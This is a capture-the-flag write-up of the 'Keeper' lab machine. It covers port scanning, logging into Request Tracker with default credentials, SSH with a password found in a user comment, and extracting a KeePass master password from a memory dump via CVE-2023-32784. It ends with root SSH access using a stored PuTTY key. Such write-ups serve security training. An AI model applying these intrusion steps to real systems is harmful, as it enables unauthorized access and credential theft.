# NMAP
```
# Nmap 7.93 scan initiated Fri Aug 25 08:19:35 2023 as: nmap -p- -Pn -sC -sV -T4 -oN nmap.txt -vvvv 10.10.11.227
Warning: 10.10.11.227 giving up on port because retransmission cap hit (6).
Nmap scan report for keeper.htb (10.10.11.227)
Host is up, received user-set (0.34s latency).
Scanned at 2023-08-25 08:19:35 EDT for 2455s
Not shown: 65408 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       REASON      VERSION
22/tcp    open     ssh           syn-ack     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3539d439404b1f6186dd7c37bb4b989e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKHZRUyrg9VQfKeHHT6CZwCwu9YkJosNSLvDmPM9EC0iMgHj7URNWV3LjJ00gWvduIq7MfXOxzbfPAqvm2ahzTc=
|   256 1ae972be8bb105d5effedd80d8efc066 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBe5w35/5klFq1zo5vISwwbYSVy1Zzy+K9ZCt0px+goO
80/tcp    open     http          syn-ack     nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

# Enumerating keeper.htb
Viewing http://keeper.htb, we are able to find another subdoomain ```tickets.keeper.htb```. We will add this subdomain to our /etc/host file

```
10.10.11.227    keeper.htb tickets.keeper.htb
```

Looking at http://tickets.keeper.htb, we are able to find that this is an open source ticketing system used by Best Practical Solutions. From https://docs.bestpractical.com/rt/5.0.0/README.html, we are able to find the default credentials to be root:password. Using this set of password, we are able to login to the ticketing system.

From http://tickets.keeper.htb/rt/Ticket/Display.html?id=300000, we are able to find a ticket relating to a problem with keepass. We can know from here, that this website or server uses keepass.

```
Lise,

Attached to this ticket is a crash dump of the keepass program. Do I need to update the version of the program first...?

Thanks!  
```

Scrolling to http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27, we are able to find the details of the user named Inorgaard. In the comments, we are able to find that the default password for the user is Welcome2023!

```
New user. Initial password set to Welcome2023!
```

Using this new set of credentials, we can then gain SSH access. 

```
┌──(kali㉿kali)-[~]
└─$ ssh lnorgaard@10.10.11.227
lnorgaard@10.10.11.227's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$ 
```

# Obtaining user.txt

```
lnorgaard@keeper:~$ cat /home/lnorgaard/user.txt
<user flag>
```

# Privilege Escalation to root
In the /home/lnorgaard directory, we are able to find a RT30000.zip file. Unzipping the file, gives us a the KeePass dump file and passcodes.kdbs files

```
┌──(kali㉿kali)-[~/Desktop/keeper]
└─$ unzip *.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx          
```

Using ```KeePassXC```, we realize that the database is password encrypted and we would need the password to view the contents of the database. Next, we will generate the hash of KeePass using keepass2john

```
┌──(kali㉿kali)-[~/Desktop/keeper]
└─$ keepass2john passcodes.kdbx
passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
```

Next, we will use John the Ripper to attempt to crack the password for the KeePass database. However, this does not yield any results.

```
┌──(kali㉿kali)-[~/Desktop/keeper]
└─$ john --format="keepass" --wordlist=rockyou.txt keepass_hash                          
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

Searching up for public exploits for Keepass, we are able to find that Keepass is vulnerable to CVE-2023-32784, that allows us to extract the plaintext password from the dump file. Using the exploit from https://github.com/CMEPW/keepass-dump-masterkey, we can then extract the password from the dump file

```
┌──(kali㉿kali)-[~/Desktop/keeper]
└─$ python3 keepass_dump.py KeePassDumpFull.dmp
2023-08-26 03:39:55,302 [.] [main] Opened KeePassDumpFull.dmp

Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```

However, there are some weird characters in the extracted password. Searching up the characters that we have retreived, we are able to find that this belongs to a Danish dessert called Rødgrød Med Fløde. Using that as the password, we are able to view the KeePass database.

Within the database, we are able to obtain a password ```F4><3K0nd!``` for the root user from the Network group, but the password does not seem to be able to authenticate to the SSH server. We are also able to extract the Putty Key file belonging to the root user from the notes

```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

Next, we can extract the private key file from the putty key file

```
puttygen root.ppk -O private-openssh -o id_rsa
```

Using the private key that we have extracted, we are able to login to the SSH server as a root user

```
┌──(kali㉿kali)-[~/Desktop/keeper]
└─$ chmod 600 id_rsa
                                                                                                               
┌──(kali㉿kali)-[~/Desktop/keeper]
└─$ ssh -i id_rsa root@10.10.11.227            
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~# 
```

# Obtaining root flag

```
root@keeper:~# cat /root/root.txt
<root flag>
```
